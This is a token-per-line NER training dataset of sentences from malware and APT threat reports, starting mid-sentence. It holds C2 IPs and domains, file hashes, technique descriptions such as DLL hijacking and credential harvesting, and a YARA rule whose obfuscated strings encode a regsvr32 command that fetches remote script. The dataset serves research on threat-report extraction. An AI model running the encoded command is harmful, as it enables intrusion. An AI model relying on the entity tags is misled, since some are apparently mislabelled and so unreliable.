associated	O
with	O
the	O
GoI	O
or	O
MoD	O
.	O

An	O
example	O
is	O
shown	O
below	O
:	O

The	O
actor	O
xman_1365_x	O
was	O
then	O
linked	O
to	O
a	O
security	O
company	O
called	O
Kavosh	O
Security	O
via	O
OSINT	O
by	O
Iran	O
Cyber	O
News	O
Agency	O
.	O

The	O
primary	O
benefit	O
of	O
DEP	O
is	O
to	O
help	O
prevent	O
code	O
execution	O
from	O
data	O
pages	O
.	O

The	O
malicious	O
code	O
bore	O
specific	O
signatures	O
that	O
have	O
historically	O
been	O
unique	O
to	O
only	O
one	O
organization	O
,	O
Sofacy	O
.	O

Asruex	B-malware.drop
operates	O
based	O
on	O
the	O
configuration	O
information	O
stored	O
in	O
itself	O
.	O

The	O
theme	O
of	O
these	O
attacks	O
appears	O
to	O
be	O
South	O
Asia	O
politics	O
.	O

If	O
a	O
debugger	O
is	O
detected	O
it	O
jumps	O
to	O
a	O
random	O
address	O
.	O

All	O
Rights	O
reserved	O
to	O
C.	O
S	O
Consultings	O
ltd	O
.	O

The	O
figure	O
below	O
shows	O
a	O
summary	O
of	O
the	O
changes	O
between	O
each	O
version	O
:	O

It	O
should	O
be	O
noted	O
that	O
the	O
reseller	O
accepted	O
Alfa	O
Click	O
,	O
PayPal	O
,	O
Payza	O
,	O
Neteller	O
,	O
Skrill	O
,	O
WebMoney	O
,	O
Perfect	O
Money	O
,	O
Bitcoin	O
,	O
Litecoin	O
,	O
SolidTrust	O
Pay	O
,	O
CashU	O
,	O
Ukash	O
,	O
OKPAY	O
,	O
EgoPay	O
,	O
paysafecard	O
,	O
Alipay	O
,	O
MG	O
,	O
Western	O
Union	O
,	O
SOFORT	O
Banking	O
,	O
QIWI	O
,	O
Bank	O
transfer	O
for	O
payment	O
.	O

The	O
activity	O
in	O
these	O
two	O
clusters	O
aligns	O
with	O
indicators	O
observed	O
in	O
Spanish	O
language	O
spam	O
runs	O
.	O

Once	O
the	O
attacker	O
receives	O
the	O
fi	O
ngerprint	O
packet	O
,	O
it	O
is	O
decrypted	O
and	O
parsed	O
.	O

Notes	O
:	O
64-bit	O
version	O
of	O
malware	O
,	O
which	O
beacons	O
to	O
58.64.178.77:443	B-ip.unknown
.	O

Then	O
copy	O
the	O
file	O
NTWDBLIB.dll	O
to	O
the	O
System	O
directory	O
and	O
execute	O
the	O
system	O
's	O
own	O
cliconfig	O
to	O
achieve	O
DLL	O
hijacking	O
and	O
load	O
NTWDBLIB.dll	O
.	O

The	O
evidence	O
available	O
is	O
currently	O
incomplete	O
and	O
at	O
the	O
moment	O
we	O
can	O
only	O
conclude	O
the	O
following	O
:	O
•	O
There	O
has	O
been	O
a	O
series	O
of	O
watering	O
hole	O
attacks	O
on	O
bank	O
supervisor	O
websites	O
in	O
Poland	O
&	O
Mexico	O
,	O
and	O
a	O
state	O
owned	O
bank	O
in	O
Uruguay	O
in	O
recent	O
months	O
.	O

Field	O
Unit	O
(	O
netui3.dll/setup35.exe/update.exe	O
)	O
Functionality	O

85d316590edfb4212049c4490db08c4b	B-hash
c1364bbf63b3617b25b58209e4529d8c	B-hash
1bfbc0c9e0d9ceb5c3f4f6ced6bcfeae	B-hash

We	O
refer	O
to	O
this	O
individual	O
as	O
'	O
Insikt	O
Group	O
's	O
source	O
'	O
in	O
other	O
sections	O
where	O
their	O
information	O
is	O
cited	O
.	O

From	O
Olympic	O
Slight	O
to	O
Data	O
Leak	O
:	O
Investigating	O
APT28	B-malware.infosteal
at	O
the	O
World	O
Anti-Doping	O
Agency	O
Conclusion	O
Appendix	O

While	O
the	O
motivation	O
for	O
each	O
APT32	B-malware.infosteal
private	O
sector	O
compromise	O
varied	O
–	O
and	O
in	O
some	O
cases	O
was	O
unknown	O
–	O
the	O
unauthorized	O
access	O
could	O
serve	O
as	O
a	O
platform	O
for	O
law	O
enforcement	O
,	O
intellectual	O
property	O
theft	O
,	O
or	O
anticorruption	O
measures	O
that	O
could	O
ultimately	O
erode	O
the	O
competitive	O
advantage	O
of	O
targeted	O
organizations	O
.	O

The	O
files	O
ExtractPDF.exe	B-malware.backdoor
and	O
Start.exe	B-malware.backdoor
simply	O
serve	O
as	O
utilities	O
to	O
open	O
the	O
PDF	O
file	O
and	O
execute	O
the	O
winsocks.exe	B-malware.backdoor
backdoor	O
component	O
.	O

Then	O
there	O
is	O
another	O
question	O
:	O
could	O
these	O
drivers	O
have	O
been	O
used	O
with	O
Duqu	B-malware.infosteal
?	O

Protecting	O
Users	O
From	O
These	O
Threats	O
10	O
.	O

To	O
thwart	O
command	O
and	O
control	O
and	O
prevent	O
data	O
loss	O
,	O
known	O
C	O
&	O
C	O
domains	O
should	O
be	O
blocked	O
at	O
the	O
egress	O
fi	O
rewall	O
.	O

Attacks	O
such	O
as	O
those	O
persistently	O
carried	O
out	O
by	O
APT28	B-malware.infosteal
target	O
multiple	O
individuals	O
in	O
multiple	O
organizations	O
who	O
run	O
a	O
wide	O
range	O
of	O
hardware	O
and	O
software	O
configurations	O
.	O

초반에는	O
주	O
로	O
군사와	O
관련된	O
정보를	O
획득하기	O
위해	O
공격을	O
전개했지만	O
2016년	O
말부터	O
금전적	O
이득을	O
위해서도	O
공격	O
을	O
진행하고	O
있어	O
각별한	O
주의가	O
필요하다	O
.	O

There	O
are	O
several	O
notable	O
features	O
of	O
the	O
backdoor	O
program	O
it	O
uses	O
:	O
the	O
program	O
uses	O
COM	O
port	O
to	O
copy	O
files	O
,	O
realize	O
UAC	O
bypass	O
and	O
two	O
system	O
DLL	O
hijacks	O
;	O
it	O
also	O
uses	O
the	O
default	O
DLLs	O
of	O
cliconfg.exe	O
and	O
SearchProtocolHost.exe	O
to	O
take	O
advantage	O
of	O
whitelist	O
;	O
finally	O
in	O
the	O
process	O
of	O
component	O
delivery	O
,	O
use	O
file	O
steganography	O
and	O
memory	O
reflection	O
loading	O
method	O
to	O
avoid	O
traffic	O
monitoring	O
and	O
achieve	O
no	O
file	O
landing	O
load	O
.	O

Two	O
files	O
are	O
downloaded	O
from	O
the	O
C2	O
server	O
.	O

One	O
is	O
a	O
legitimate	O
Windows	O
tool	O
,	O
pvk2pfx.exe	O
,	O
that	O
is	O
abused	O
for	O
DLL	O
side-loading	O
.	O

TABLE	O
1	O
:	O
APT28	B-malware.infosteal
TARG	O
E	O
TI	O
NGOFPO	O
LITIC	O
AL	O
ENTITI	O
E	O
S	O
AN	O
D	O
I	O
NTRUSIO	O
N	O
AC	O
TIVIT	O
Y	O

The	O
first	O
thread	O
is	O
the	O
'	O
communication	O
'	O
thread	O
.	O

Below	O
is	O
a	O
subset	O
of	O
attachment	O
names	O
that	O
we	O
have	O
observed	O
.	O

As	O
implied	O
above	O
,	O
DarkComet	B-malware.backdoor
supports	O
three	O
types	O
of	O
DDoS	O
attacks	O
:	O
HTTP	O
flooding	O
,	O
UDP	O
flooding	O
,	O
and	O
TCP	O
flooding	O
(	O
mis-advertised	O
as	O
'	O
SYNFLOOD	O
'	O
)	O
.	O

Cylance	O
only	O
found	O
two	O
variants	O
to	O
this	O
code-block	O
,	O
however	O
,	O
that	O
could	O
be	O
easily	O
modified	O
by	O
the	O
attacker	O
in	O
the	O
future	O
.	O

It	O
's	O
ridiculous	O
.	O

The	O
following	O
string	O
represents	O
the	O
obfuscated	O
format	O
of	O
the	O
Command	O
&	O
Control	O
(	O
C2	O
)	O
domain	O
:	O

Compromised	O
servers	O
are	O
in	O
some	O
cases	O
used	O
to	O
conduct	O
attacks	O
on	O
other	O
resources	O
.	O

The	O
certificates	O
are	O
self-signed	O
,	O
or	O
signed	O
by	O
the	O
Comodo	O
certificate	O
authority	O
.	O

<	O
systemroot	O
>	O
\\rundll32.exe	O
<	O
zxshell	B-malware.backdoor
dll	O
name	O
>	O
,	O
zxFunction002	O
<	O
name	O
of	O
NamedPipe	O
>	O

In	O
addition	O
to	O
the	O
links	O
between	O
the	O
addresses	O
,	O
streets	O
,	O
and	O
names	O
,	O
they	O
found	O
that	O
the	O
registrant	O
phone	O
numbers	O
were	O
also	O
very	O
closely	O
related	O
.	O

Collegiate	O
Cyber	O
Defense	O
Competition	O
(	O
CCDC	O
)	O
North	O
East	O
CCDC	O
2008-2015	O
Mid	O
Atlantic	O
CCDC	O
2011-2015	O
Pacific	O
Rim	O
CCDC	O
2012	O
,	O
2014	O
South	O
East	O
CCDC	O
-	O
2014	O
Western	O
Regional	O
CCDC	O
-	O
2013	O
National	O
CCDC	O
2012-2014	O

Then	O
'	O
b.exe	O
'	O
is	O
executed	O
.	O

Iran	O
's	O
Cyberspace	O
Research	O
Institute	O
(	O
CSRI	O
)	O
is	O
a	O
research	O
center	O
affiliated	O
with	O
the	O
prestigious	O
Shahid	O
Beheshti	O
University	O
in	O
Iran	O
.	O

Persistent	O
remote	O
Indian	O
access	O
to	O
a	O
strategic	O
communications	O
service	O
provider	O
,	O
such	O
as	O
Telenor	O
Pakistan	O
,	O
would	O
certainly	O
yield	O
unparalleled	O
signals	O
intelligence	O
collection	O
capability	O
.	O

createEncodeToken	O
:	O
size_token	O
:	O
]	O

The	O
following	O
is	O
a	O
screenshot	O
of	O
the	O
email	O
:	O
The	O
'	O
Payment	B-malware.infosteal
details.jar	I-malware.infosteal
'	O
malware	O
beaconed	O
to	O
'	O
morechedder.no-ip[.]org	B-malware.infosteal
'	O
over	O
port	O
'	O
100	O
'	O
.	O

Even	O
if	O
you	O
accidentally	O
download	O
malware	O
onto	O
your	O
phone	O
,	O
Avast	O
will	O
detect	O
and	O
remove	O
the	O
malware	O
,	O
to	O
keep	O
your	O
data	O
and	O
privacy	O
safe	O
.	O

Both	O
of	O
these	O
.scr	O
files	O
have	O
the	O
same	O
MD5	O
.	O

This	O
campaign	O
relies	O
on	O
multiple	O
payloads	O
fashioned	O
out	O
of	O
the	O
Destover	B-malware.backdoor
infostealer	O
code	O
to	O
collect	O
information	O
about	O
the	O
victim	O
system	O
and	O
exfiltrate	O
files	O
.	O

FireEye	O
believes	O
the	O
change	O
from	O
RIPTIDE	B-malware.backdoor
to	O
HIGHTIDE	B-malware.backdoor
represents	O
a	O
temporary	O
tool	O
shift	O
to	O
decrease	O
malware	O
detection	O
while	O
APT12	O
developed	O
a	O
completely	O
new	O
malware	O
toolset	O
.	O

This	O
means	O
that	O
the	O
submitter	O
sent	O
one	O
or	O
more	O
samples	O
of	O
a	O
given	O
APT	B-malware.unknown
campaign	O
to	O
VirusTotal	O
before	O
its	O
public	O
release	O
.	O

In	O
early	O
May	O
,	O
we	O
were	O
alerted	O
that	O
Bahraini	O
activists	O
were	O
targeted	O
with	O
apparently	O
malicious	O
e-mails	O
.	O

Becoming	O
familiar	O
with	O
the	O
operations	O
of	O
the	O
Poseidon	B-malware.infosteal
Group	O
meant	O
patiently	O
dismantling	O
their	O
modus	O
operandi	O
to	O
unearth	O
the	O
custom­designed	O
infection	O
tools	O
deployed	O
to	O
each	O
of	O
their	O
selected	O
targets	O
.	O

14BFDA4A4ACA1276388702D0FB7629AF120FF34C1ACDEB7613815F2981C99832	B-hash
2014-05-07	O
508909C8A00026C904F52099DD62BBF4062B4E8E40FC0601BD9E13570514B4F5	B-hash
2014-05-06	O
7170A07BCB5B0467A75CBD17A1A1877AEC3C8EA43C45D3BED6AB5E6C95A62713	B-hash
2014-05-06	O
9A10916AD0F43FA3376C2E54FD5CFDD06D684B3A19895ED4107FAF9F3313DCDA	B-hash
2014-05-07	O
E28EABEB678AFB5E172F4127C5692E742809FD86DFA8478C1DC6F9C13B2A8E5F	B-hash
2014-05-06	O
UNKNOWN	O
E28EABEB678AFB5E172F4127C5692E742809FD86DFA8478C1DC6F9C13B2A8E5F	B-hash
2014-05-07	O

MD5	O
:	O
4f1ffebb45b30dd3496caaf1fa9c77e3	B-hash

In	O
attempt	O
to	O
overcome	O
network	O
filtering	O
solutions	O
,	O
the	O
attackers	O
implemented	O
a	O
stealthier	O
C2	O
communication	O
method	O
,	O
using	O
'	O
DNS	O
Tunneling	O
'	O
–	O
a	O
method	O
of	O
C2	O
communicating	O
and	O
data	O
exfiltration	O
using	O
the	O
DNS	O
protocol	O
.	O

Possibly	O
in	O
response	O
to	O
our	O
previous	O
report	O
,	O
we	O
've	O
seen	O
some	O
of	O
the	O
groups	O
using	O
ScanBox	B-malware.infosteal
alter	O
the	O
content	O
of	O
the	O
modules	O
to	O
evade	O
detection	O
.	O

The	O
highest	O
value	O
asset	O
for	O
these	O
companies	O
is	O
proprietary	O
information	O
,	O
technologies	O
,	O
and	O
business­	O
sensitive	O
information	O
that	O
represents	O
significant	O
value	O
in	O
relation	O
to	O
investments	O
and	O
stock	O
valuations	O
.	O

OS	O
version	O
information	O
;	O
the	O
newest	O
version	O
known	O
to	O
it	O
is	O
Windows	O
7	O
/	O
2008R2	O
.	O

It	O
turns	O
out	O
that	O
this	O
mysterious	O
value	O
stored	O
at	O
an	O
offset	O
from	O
EBX	O
is	O
passed	O
into	O
EncryptData_sub_49D9EC	O
(	O
)	O
via	O
the	O
EAX	O

While	O
other	O
techniques	O
are	O
also	O
utilized	O
to	O
conceal	O
and	O
inhibit	O
its	O
removal	O
,	O
ZxShell	B-malware.backdoor
's	O
primary	O
functionality	O
is	O
to	O
act	O
as	O
a	O
Remote	B-malware.drop
Administration	I-malware.drop
Tool	I-malware.drop
(	O
RAT	B-malware.drop
)	O
,	O
allowing	O
the	O
threat	O
actor	O
to	O
have	O
continuous	O
backdoor	O
access	O
on	O
to	O
the	O
compromised	O
machine	O
.	O

Test	B-malware.backdoor
Commands	I-malware.backdoor
One	I-malware.backdoor
-­‐	O
Infection	O
Attempt	O
and	O
Retrieval	O
of	O
Data	O
Collection	O
From	O
a	O
Remote	O
System	O
Command	O

It	O
includes	O
some	O
logic	O
to	O
exclude	O
XOR'ng	O
any	O
bytes	O
that	O
match	O
0x00000000	O
or	O
the	O
current	O
4-byte	O
XOR	O
key	O
.	O

The	O
group	O
uses	O
some	O
of	O
the	O
infected	O
servers	O
for	O
auxiliary	O
purposes	O
–	O
to	O
host	O
tools	O
and	O
logs	O
.	O

Cryptography	O
&	O
Network	O
Security	O
Lab	O
,	O
Dongseo	O
University	O
San	O
69-1	O
,	O
Jurye	O
2-dong	O
,	O
Sasang-gu	O
,	O
Busan	O
617-716	O
,	O
Korea	O

d956e2ff1b22ccee2c5d9819128103d4c31ecefde3ce463a6dea19ecaaf418a1	B-hash
5504e04083d6146a67cb0d671d8ad5885315062c9ee08a62e40e264c2d5eab91	B-hash
f6449e255bc1a9d4a02391be35d0dd37def19b7e20cfcc274427a0b39cb21b7b	B-hash
db7c1534dede15be08e651784d3a5d2ae41963d192b0f8776701b4b72240c38d	B-hash

We	O
have	O
also	O
observed	O
this	O
group	O
target	O
companies	O
within	O
the	O
US	O
defense	O
industrial	O
base	O
.	O

ShellMainThread	O

The	O
driver	O
,	O
after	O
hooking	O
the	O
firewall	O
using	O
either	O
of	O
the	O
two	O
mentioned	O
interfaces	O
,	O
will	O
inspect	O
incoming	O
network	O
packets	O
.	O

No	O
other	O
IP-addresses	O
have	O
been	O
uncovered	O
that	O
would	O
point	O
to	O
the	O
attackers	O
'	O
activity	O
and	O
belong	O
to	O
other	O
IP-ranges	O
.	O

It	O
generates	O
shellcode	O
whose	O
purpose	O
is	O
to	O
call	O
the	O
function	O
reading	O
the	O
encrypted	O
stage-two	O
shellcode	O
in	O
the	O
mcscentr.adf	O
file	O
.	O

A	O
200.63.46.23	B-ip.unknown
17	O
www.trxforcekitoriginal.com	B-url.unknown
.	O

The	O
configuration	O
Information	O
includes	O
C	O
&	O
C	O
servers	O
and	O
dummy	O
hosts	O
that	O
it	O
connects	O
to	O
,	O
and	O
also	O
version	O
information	O
and	O
a	O
key	O
to	O
decode	O
data	O
which	O
is	O
delivered	O
.	O

Use	O
of	O
the	O
same	O
C2	O
infrastructure	O
that	O
was	O
used	O
to	O
target	O
senior	O
army	O
officers	O
The	O
attackers	O
in	O
this	O
case	O
used	O
multiple	O
techniques	O
to	O
avoid	O
detection	O
and	O
to	O
frustrate	O
analysts	O
.	O

The	O
base64	O
encoded	O
content	O
downloaded	O
from	O
the	O
Pastebin	O
link	O
is	O
then	O
decoded	O
to	O
an	O
executable	O
and	O
dropped	O
on	O
the	O
system	O
.	O

Security	O
Response	O
Attack	O
Investigation	O
Team	O

How	O
long	O
have	O
the	O
attackers	O
been	O
active	O
?	O

Module	O
2	O
established	O
and	O
listed	O
system	O
process	O
rundll32.exe	O
:	O

Decrypting	O
it	O
revealed	O
the	O
following	O
:	O

Additional	O
publicly	O
known	O
Iranian	O
contractors	O
include	O
ITSecTeam	O
(	O
ITSEC	O
)	O
and	O
Mersad	O
Company	O
,	O
also	O
linked	O
to	O
Operation	O
Ababil	O
.	O

7C5272F3F24ACB225270DDED72CFC1D4	B-hash
flashsoft.no-ip.biz	B-url.cncsvr

The	O
C	O
&	O
Cs	O
given	O
in	O
the	O
BadCyber	O
analysis	O
were	O
the	O
following	O
IP	O
addresses	O
:	O

We	O
have	O
only	O
observed	O
two	O
samples	O
where	O
a	O
backup	O
Twitter	O
account	O
was	O
actually	O
specified	O
in	O
the	O
configuration	O
data	O
.	O

It	O
is	O
a	O
relatively	O
large	O
executable	O
(	O
~1.2	O
mb	O
)	O
that	O
injects	O
malicious	O
code	O
and	O
spawns	O
remote	O
threads	O
into	O
legitimate	O
processes	O
.	O

13/07/2018	O

C	O
:	O
\Documents	O
and	O
Settings\Administrator\Desktop	O
>	O
upx	O
-d	O
5001ef50c7e869253a7c152a638eab8a.exe	O
-o	O
decomp.exe	O
Ultimate	O
Packer	O
for	O
eXecutables	O
Copyright	O
(	O
C	O
)	O
1996	O
-	O
2011	O
UPX	O
3.08w	O
Markus	O
Oberhumer	O
,	O
Laszlo	O
Molnar	O
&	O
John	O
Reiser	O
Dec	O
12th	O
2011	O
File	O
size	O
Ratio	O
Format	O
Name	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
--	O
-	O
--	O
--	O
--	O
--	O
--	O
-700416	O
<	O
-	O
220672	O
31.51	O
%	O
win32/pe	O
decomp.exe	O
Unpacked	O
1	O
file	O
.	O

This	O
executable	O
itself	O
is	O
a	O
WinRAR	O
selfextracting	O
(	O
SFX	O
)	O
archive	O
,	O
which	O
contains	O
several	O
other	O
files	O
:	O

ipconfig	O
/all	O
–	O
display	O
all	O
current	O
TCP/IP	O
network	O
configuration	O
values	O

Once	O
the	O
URL	O
and	O
command	O
string	O
is	O
extracted	O
,	O
the	O
malware	O
compares	O
the	O
command	O
string	O
with	O
the	O
string	O

The	O
table	O
presents	O
the	O
average	O
number	O
of	O
days	O
for	O
the	O
entire	O
campaign	O
,	O
and	O
we	O
go	O
from	O
a	O
few	O
months	O
as	O
in	O
the	O
case	O
of	O
'	O
Aurora	B-malware.unknown
'	O
to	O
more	O
than	O
three	O
years	O
for	O
'	O
Equation	B-malware.unknown
'	O
.	O

Our	O
research	O
suggests	O
links	O
between	O
this	O
campaign	O
and	O
other	O
campaigns	O
that	O
have	O
been	O
attributed	O
to	O
an	O
Indian	O
security	O
company	O
called	O
Appin	O
Security	O
Group	O
.	O

'	O
Cyber	O
Researchers	O
Confirm	O
Russian	O
Government	O
Hack	O
of	O
Democratic	O
National	O
Committee	O
.	O
'	O

The	O
decrypted	O
string	O
is	O
expected	O
to	O
delimit	O
C	O
&	O
C	O
address	O
and	O
port	O
number	O
with	O
the	O
'	O
:	O
'	O
character	O
.	O

The	O
Shamoon	B-malware.unknown
malware	O
has	O
received	O
considerable	O
coverage	O
in	O
the	O
past	O
couple	O
of	O
months	O
because	O
of	O
its	O
destructive	O
nature	O
.	O

Trend	O
MicroTM	O
Deep	O
DiscoveryTM	O
provides	O
detection	O
,	O
in-depth	O
analysis	O
,	O
and	O
proactive	O
response	O
to	O
today	O
's	O
stealthy	O
malware	O
,	O
and	O
targeted	O
attacks	O
in	O
real	O
time	O
.	O

Fake	O
Kik	O
messenger	O
SHA256	O
:	O

We	O
have	O
seen	O
other	O
APT	O
such	O
as	O
Crouching	B-malware.drop
Yeti	I-malware.drop
and	O
Darkhotel	B-malware.infosteal
distribute	O
poisoned	O
installers	O
and	O
poisoned	O
executable	O
code	O
,	O
then	O
redistribute	O
them	O
through	O
similar	O
tactics	O
and	O
over	O
p2p	O
networks	O
.	O

Dropper	O
MD5	O
:	O
DLL	O
Filename	O
:	O
Mutex	O
:	O
C	O
&	O
C	O
Host	O
:	O

This	O
file	O
is	O
dropped	O
by	O
the	O
executable	O
file	O
with	O
MD5	O
hash	O
:	O
4F4BF27B738FF8F2A89D1BC487B054A8	B-hash
.	O

strings	O
:	O
//	O
OBSFUCATION	O
$	O
ob1	O
=	O
'	O
ChrW	O
(	O
114	O
)	O
&	O
ChrW	O
(	O
101	O
)	O
&	O
ChrW	O
(	O
103	O
)	O
&	O
ChrW	O
(	O
115	O
)	O
&	O
ChrW	O
(	O
118	O
)	O
&	O
ChrW	O
(	O
114	O
)	O
&	O
ChrW	O
(	O
51	O
)	O
&	O
ChrW	O
(	O
50	O
)	O
&	O
ChrW	O
(	O
46	O
)	O
&	O
ChrW	O
(	O
101	O
)	O
'	O
ascii	O
wide	O
$	O
ob2	O
=	O
'	O
ChrW	O
(	O
120	O
)	O
&	O
ChrW	O
(	O
101	O
)	O
&	O
ChrW	O
(	O
32	O
)	O
&	O
ChrW	O
(	O
47	O
)	O
&	O
ChrW	O
(	O
115	O
)	O
&	O
ChrW	O
(	O
32	O
)	O
&	O
ChrW	O
(	O
47	O
)	O
&	O
ChrW	O
(	O
110	O
)	O
&	O
ChrW	O
(	O
32	O
)	O
&	O
ChrW	O
(	O
47	O
)	O
'	O
ascii	O
wide	O
$	O
ob3	O
=	O
'	O
ChrW	O
(	O
117	O
)	O
&	O
ChrW	O
(	O
32	O
)	O
&	O
ChrW	O
(	O
47	O
)	O
&	O
ChrW	O
(	O
105	O
)	O
&	O
ChrW	O
(	O
58	O
)	O
&	O
ChrW	O
(	O
104	O
)	O
&	O
ChrW	O
(	O
116	O
)	O
&	O
ChrW	O
(	O
116	O
)	O
&	O
ChrW	O
(	O
112	O
)	O
&	O
ChrW	O
(	O
115	O
)	O
'	O
ascii	O
wide	O
$	O
ob4	O
=	O
'	O
ChrW	O
(	O
58	O
)	O
&	O
ChrW	O
(	O
47	O
)	O
&	O
ChrW	O
(	O
47	O
)	O
&	O
ChrW	O
(	O
108	O
)	O
&	O
ChrW	O
(	O
121	O
)	O
&	O
ChrW	O
(	O
110	O
)	O
&	O
ChrW	O
(	O
99	O
)	O
&	O
ChrW	O
(	O
100	O
)	O
&	O
ChrW	O
(	O
105	O
)	O
&	O
ChrW	O
(	O
115	O
)	O
'	O
ascii	O
wide	O
$	O
ob5	O
=	O
'	O
ChrW	O
(	O
99	O
)	O
&	O
ChrW	O
(	O
111	O
)	O
&	O
ChrW	O
(	O
118	O
)	O
&	O
ChrW	O
(	O
101	O
)	O
&	O
ChrW	O
(	O
114	O
)	O
&	O
ChrW	O
(	O
46	O
)	O
&	O
ChrW	O
(	O
50	O
)	O
&	O
ChrW	O
(	O
98	O
)	O
&	O
ChrW	O
(	O
117	O
)	O
&	O
ChrW	O
(	O
110	O
)	O
'	O
ascii	O
wide	O
$	O
ob6	O
=	O
'	O
ChrW	O
(	O
110	O
)	O
&	O
ChrW	O
(	O
121	O
)	O
&	O
ChrW	O
(	O
46	O
)	O
&	O
ChrW	O
(	O
99	O
)	O
&	O
ChrW	O
(	O
111	O
)	O
&	O
ChrW	O
(	O
109	O
)	O
&	O
ChrW	O
(	O
47	O
)	O
&	O
ChrW	O
(	O
65	O
)	O
&	O
ChrW	O
(	O
117	O
)	O
&	O
ChrW	O
(	O
116	O
)	O
'	O
ascii	O
wide	O
$	O
ob7	O
=	O
'	O
ChrW	O
(	O
111	O
)	O
&	O
ChrW	O
(	O
100	O
)	O
&	O
ChrW	O
(	O
105	O
)	O
&	O
ChrW	O
(	O
115	O
)	O
&	O
ChrW	O
(	O
99	O
)	O
&	O
ChrW	O
(	O
111	O
)	O
&	O
ChrW	O
(	O
118	O
)	O
&	O
ChrW	O
(	O
101	O
)	O
&	O
ChrW	O
(	O
114	O
)	O
&	O
ChrW	O
(	O
32	O
)	O
'	O
ascii	O
wide	O
$	O
ob8	O
=	O
'	O
ChrW	O
(	O
115	O
)	O
&	O
ChrW	O
(	O
99	O
)	O
&	O
ChrW	O
(	O
114	O
)	O
&	O
ChrW	O
(	O
111	O
)	O
&	O
ChrW	O
(	O
98	O
)	O
&	O
ChrW	O
(	O
106	O
)	O
&	O
ChrW	O
(	O
46	O
)	O
&	O
ChrW	O
(	O
100	O
)	O
&	O
ChrW	O
(	O
108	O
)	O
&	O
ChrW	O
(	O
108	O
)	O
'	O
ascii	O
wide	O
$	O
obreg1	O
=	O
/	O
(	O
\w	O
{	O
5	O
}	O
\s	O
&	O
\s	O
)	O
{	O
7	O
}	O
\w	O
{	O
5	O
}	O
/	O
$	O
obreg2	O
=	O
/	O
(	O
Chrw\	O
(	O
\d	O
{	O
1,3	O
}	O
\	O
)	O
\s	O
&	O
\s	O
)	O
{	O
7	O
}	O
/	O
//	O
wscript	O
$	O
wsobj1	O
=	O
'	O
Set	O
Obj	O
=	O
CreateObject	O
(	O
\'WScript.Shell\	O
'	O
)	O
'	O
ascii	O
wide	O
$	O
wsobj2	O
=	O
'	O
Obj.Run	O
'	O
ascii	O
wide	O
condition	O
:	O
(	O
uint16	O
(	O
0	O
)	O
!	O
=	O
0x5A4D	O
)	O
all	O
of	O
(	O
$	O
wsobj*	O
)	O
and	O
3	O
of	O
(	O
$	O
ob*	O
)	O
all	O
of	O
(	O
$	O
wsobj*	O
)	O
and	O
all	O
of	O
(	O
$	O
obreg*	O
)	O
rule	O
FE_LEGALSTRIKE_MACRO_2	O
{	O
meta:version='.1	O
'	O
filetype='MACRO	O
'	O
author='Ian.Ahl@fireeye.com	O
@	O
TekDefense	O
'	O
date='2017-06-02	O
'	O
description='This	O
rule	O
was	O
written	O
to	O
hit	O
on	O
specific	O
variables	O
and	O
powershell	O
command	O
fragments	O
as	O
seen	O
in	O
the	O
macro	O
found	O
in	O
the	O
XLSX	O
file3a1dca21bfe72368f2dd46eb4d9b48c4	O
.	O
'	O

Attacks	O
are	O
often	O
transmitted	O
to	O
potential	O
victims	O
from	O
the	O
accounts	O
of	O
people	O
with	O
whom	O
they	O
are	O
familiar	O
.	O

Infrastructure	O
Overlap	O
Domain	O
|	O
Previous	O
IP	O
resolution	O

c	O
:	O
\Users\KKK\Desktop\Shell_siver\Shell_siver\obj\Release\Shell_siver.pdb	O

Can	O
be	O
used	O
to	O
execute	O
arbitrary	O
commands	O
by	O
invoking	O
C	O
:	O
\	O
Windows\System32\cmd.exe	O
Will	O
attempt	O
to	O
harvest	O
stored	O
credentials	O
from	O
the	O
victim	O
Will	O
attempt	O
to	O
harvest	O
credentials	O
stored	O
on	O
the	O
victim	O
host	O
that	O
are	O
used	O
as	O
part	O
of	O
Windows	O
NTLM	O
user	O
authentication	O
Will	O
attempt	O
to	O
gather	O
comprehensive	O
information	O
on	O
the	O
victim	O
host	O
's	O
configuration	O
Will	O
take	O
a	O
screenshot	O
of	O
the	O
victim	O
host	O
We	O
have	O
observed	O
executables	O
executed	O
by	O
CozyDuke	B-malware.drop
for	O
the	O
following	O
purposes	O
:	O
•	O
Dropping	O
and	O
executing	O
scripts	O
for	O
collecting	O
information	O
and	O
credentials	O
from	O
the	O
victim	O
organization	O
's	O
Active	O
Directory	O
environment	O
•	O
Dropping	O
and	O
executing	O
scripts	O
for	O
further	O
penetrating	O
the	O
victim	O
organization	O
with	O
the	O
help	O
of	O
commonly	O
available	O
tools	O
such	O
as	O
Mimikatz	O
and	O
PSExec	O
•	O
Dropping	O
and	O
executing	O
additional	O
malware	O
with	O
the	O
same	O
file	O
and	O
export	O
naming	O
conventions	O
as	O
OnionDuke	O
and	O
the	O
same	O
string	O
encryption	O
algorithm	O
as	O
OnionDuke	O
These	O
executables	O
will	O
implement	O
their	O
own	O
methods	O
of	O
C	O
&	O
C	O
communication	O
and	O
data	O
exfiltration	O
.	O

Given	O
the	O
use	O
of	O
lure	O
documents	O
designed	O
with	O
social	O
engineering	O
in	O
mind	O
,	O
it	O
is	O
likely	O
that	O
the	O
attackers	O
use	O
phishing	O
or	O
spam	O
to	O
target	O
users	O
who	O
are	O
unaware	O
of	O
these	O
documents	O
'	O
malicious	O
nature	O
.	O

execFile	O

Armitage	O
can	O
carry	O
out	O
automatic	O
attacks	O
by	O
combining	O
with	O
known	O
exploits	O
of	O
Metasploit	O
.	O

The	O
ZIP	O
file	O
contains	O
a	O
malicious	O
executable	O
written	O
in	O
AutoIt	O
(	O
contents	O
of	O
this	O
executable	O
are	O
shown	O
in	O
Figur	O
16	O
)	O
.	O

Below	O
screen	O
shot	O
shows	O
one	O
of	O
the	O
post	O
containing	O
base64	O
encoded	O
data	O
made	O
by	O
the	O
user	O
on	O
Sept	O
26th,2016	O
Doing	O
a	O
Google	O
search	O
for	O
the	O
Pastebin	O
userid	O
landed	O
me	O
on	O
a	O
YouTube	O
video	O
posted	O
by	O
an	O
individual	O
demonstrating	O
his	O
modified	O
version	O
of	O
njRAT	B-malware.backdoor
control	O
panel/builder	O
kit	O
.	O

getIntegerFromProcName	O
]	O

Outside	O
of	O
an	O
insightful	O
blog	O
post	O
from	O
security	O
researcher	O
Keith	O
Tyler	O
,	O
little	O
useful	O
information	O
on	O
China	B-malware.backdoor
Chopper	I-malware.backdoor
is	O
publically	O
available	O
.	O

Figure	O
10	O
.	O

Function	O
ComputeKeySuffix_sub_48F52C	O
(	O
)	O

Download	O
from	O
the	O
